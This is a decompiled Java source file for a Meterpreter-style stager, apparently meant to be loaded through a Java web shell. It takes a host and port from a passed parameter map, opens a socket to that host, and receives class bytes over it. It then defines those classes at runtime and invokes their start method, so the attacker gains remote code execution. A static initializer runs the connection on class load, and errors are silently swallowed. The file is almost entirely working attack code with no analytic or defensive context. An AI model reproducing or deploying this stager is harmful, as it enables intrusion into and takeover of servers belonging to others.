/*
 * Decompiled with CFR 0.152.
 */

import java.io.DataInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.HashMap;

public class Meterpreter
extends ClassLoader
implements Runnable {
    private HashMap parameterMap;

    public String host;
    public String port;
    static /* synthetic */ Class class$0;
    static /* synthetic */ Class class$1;
    static /* synthetic */ Class class$2;

    public void initLhost() {
        this.host = "";
        this.port = "";
    }




    public String toString() {
        if (this.host != null && this.port != null) {
            Thread thread = new Thread(this);
            thread.start();
            this.parameterMap.put("result", "ok".getBytes());
        } else {
            this.parameterMap.put("result", "host or port is null".getBytes());
        }
        this.parameterMap = null;
        return "";
    }

    public boolean equals(Object paramObject) {
        try {
            this.parameterMap = (HashMap)paramObject;
            this.host = this.get("host");
            this.port = this.get("port");
        }
        catch (Exception e) {
            return false;
        }
        return true;
    }

    public void getShell() throws Exception {
        InputStream inputStream1 = null;
        OutputStream outputStream = null;
        int j = new Integer(this.port);
        String str4 = this.host;
        Socket socket = null;
        if (str4 != null) {
            socket = new Socket(str4, j);
        }
        inputStream1 = socket.getInputStream();
        outputStream = socket.getOutputStream();
        new Meterpreter().bootstrap(inputStream1, outputStream);
    }

    private final void bootstrap(InputStream paramInputStream, OutputStream paramOutputStream) throws Exception {
        try {
            Class<?> clazz;
            DataInputStream dataInputStream = new DataInputStream(paramInputStream);
            int i = dataInputStream.readInt();
            do {
                byte[] arrayOfByte = new byte[i];
                dataInputStream.readFully(arrayOfByte);
                clazz = this.defineClass(null, arrayOfByte, 0, i);
                this.resolveClass(clazz);
            } while ((i = dataInputStream.readInt()) > 0);
            Object object = clazz.newInstance();
            Class[] classArray = new Class[3];
            Class<?> clazz2 = class$0;
            if (clazz2 == null) {
                try {
                    clazz2 = class$0 = Class.forName("java.io.DataInputStream");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[0] = clazz2;
            Class<?> clazz3 = class$1;
            if (clazz3 == null) {
                try {
                    clazz3 = class$1 = Class.forName("java.io.OutputStream");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[1] = clazz3;
            Class<?> clazz4 = class$2;
            if (clazz4 == null) {
                try {
                    clazz4 = class$2 = Class.forName("[Ljava.lang.String;");
                }
                catch (ClassNotFoundException classNotFoundException) {
                    throw new NoClassDefFoundError(classNotFoundException.getMessage());
                }
            }
            classArray[2] = clazz4;
            clazz.getMethod("start", classArray).invoke(object, dataInputStream, paramOutputStream, new String[]{"", ""});
        }
        catch (Throwable throwable) {
            // empty catch block
        }
    }

    public static void main(String[] args) {
        Meterpreter meterpreter =new Meterpreter();
        meterpreter.run();
    }

    static {

        Meterpreter meterpreter =new Meterpreter();
        meterpreter.initLhost();
        meterpreter.run();
    }

    public void run() {
        try {
            this.getShell();
        }
        catch (Exception exception) {
            System.out.println(exception);
            // empty catch block
        }
    }

    public String get(String key) {
        try {
            return new String((byte[])this.parameterMap.get(key));
        }
        catch (Exception e) {
            return null;
        }
    }
}
